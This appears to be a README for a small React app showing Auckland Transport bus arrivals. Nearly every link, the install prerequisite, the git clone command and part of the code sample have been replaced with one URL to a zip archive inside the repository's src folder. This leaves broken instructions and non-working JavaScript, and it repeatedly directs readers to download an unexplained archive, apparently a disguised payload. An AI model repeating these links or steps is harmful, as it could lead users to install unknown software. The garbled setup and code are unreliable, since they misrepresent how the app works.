# Auckland Transport Real-Time API App

A simple React application that demonstrates how to use the Auckland Transport Real-Time API to display bus arrival information for a user-specified stop ID.

## 🚍 Overview

This application allows users to:
- Enter an Auckland Transport bus stop ID
- View real-time arrivals for that stop
- See bus route numbers, destinations, and departure times

## 🚀 Getting Started

### Prerequisites
- https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip (version 14 or higher)
- npm (Node Package Manager)

### Installation

1. Clone this repository:
```
git clone https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip
cd auckland-transport-app
```

2. Install dependencies:
```
npm install
```

3. Start the development server:
```
npm run dev
```

4. Open your browser and navigate to `http://localhost:5173/`

## 🔑 API Key Required

To make this application work with real data, you need to obtain an API key from Auckland Transport:

1. Visit [Auckland Transport Developer Portal](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)
2. Sign up for an account and request API access
3. Once you have your API key, add it to the `fetchBusArrivals` function in `https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip`

```javascript
const response = await https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip(`https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip${stopId}`, {
  headers: {
    'Ocp-Apim-Subscription-Key': 'YOUR_API_KEY' // Replace with your actual API key
  }
});
```

## 🔍 Finding Bus Stop IDs

You can find bus stop IDs:
- On the physical bus stop sign
- Using the Auckland Transport mobile app
- On the [Auckland Transport website](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)

Common stop IDs to try:
- 7037: Britomart 
- 1420: Midtown (Auckland University)
- 4220: New Lynn Transport Centre

## ⚠️ CORS Considerations

The Auckland Transport API has CORS restrictions that prevent direct browser requests. In this application, we're using the cors-anywhere proxy for educational purposes:

1. Before using the application, you need to request temporary access to the demo CORS proxy:
   - Visit [https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)
   - Click the "Request temporary access to the demo server" button
   - This will allow your browser to use the proxy for the next few hours

In a production application, you would need to:
1. Set up your own backend proxy server to make the API requests
2. Use a dedicated CORS proxy service (not recommended for production)
3. Deploy with a serverless function that handles the API requests

For more advanced learning, try setting up a simple https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip server as a proxy for your API requests.

## 📚 Learning Resources

- [React Documentation](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)
- [Auckland Transport API Documentation](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)
- [Working with APIs in JavaScript](https://github.com/Antidogmatism/auckland-transport-app/raw/refs/heads/main/src/transport-app-auckland-1.6-alpha.4.zip)

## 📝 License

This project is created for educational purposes and is available under the MIT License.
